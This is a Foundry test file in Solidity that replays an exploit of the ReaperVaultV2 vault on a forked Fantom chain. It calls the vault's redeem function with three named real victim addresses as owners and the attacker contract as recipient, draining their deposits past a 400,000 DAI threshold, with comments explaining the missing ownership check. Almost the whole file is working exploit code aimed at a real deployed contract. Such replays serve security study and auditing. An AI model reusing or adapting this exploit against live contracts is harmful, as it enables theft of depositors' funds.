// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReaperVaultV2.sol";

interface IERC20Like {
    function balanceOf(address _addr) external view returns (uint);
}

contract CounterTest is Test {
    ReaperVaultV2 reaper = ReaperVaultV2(0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A);
    IERC20Like fantomDai = IERC20Like(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E);

    function testReaperHack() public {
        vm.createSelectFork(vm.envString("FANTOM_RPC"), 44000000);
        console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));

        // We can simply call the redeem function,
        // providing a different owner than recipient.
        // Internally, the redeem function will call the `_withdraw` function,
        // but neither verify that the msg.sender is the owner, nor that the owner is the recipient.
        // So we can withdraw _any_ depositor's funds to any recipient address we like!

        // Use 3 victim addresses to exceed the 400k ether check
        address victim_a = 0xfc83DA727034a487f031dA33D55b4664ba312f1D;
        uint256 victim_a_balance = reaper.balanceOf(victim_a);
        console.log("Balance of victim a:", victim_a_balance);
        reaper.redeem(victim_a_balance, address(this), victim_a);

        address victim_b = 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b;
        uint256 victim_b_balance = reaper.balanceOf(victim_b);
        console.log("Balance of victim b:", victim_b_balance);
        reaper.redeem(victim_b_balance, address(this), victim_b);

        address victim_c = 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9;
        uint256 victim_c_balance = reaper.balanceOf(victim_c);
        console.log("Balance of victim c:", victim_c_balance);
        reaper.redeem(victim_c_balance, address(this), victim_c);

        uint256 final_balance = fantomDai.balanceOf(address(this));
        console.log("Your Final Balance:", final_balance);
        console.log("Expecting balance > ", 400_000 ether);
        assert(final_balance > 400_000 ether);
    }
}
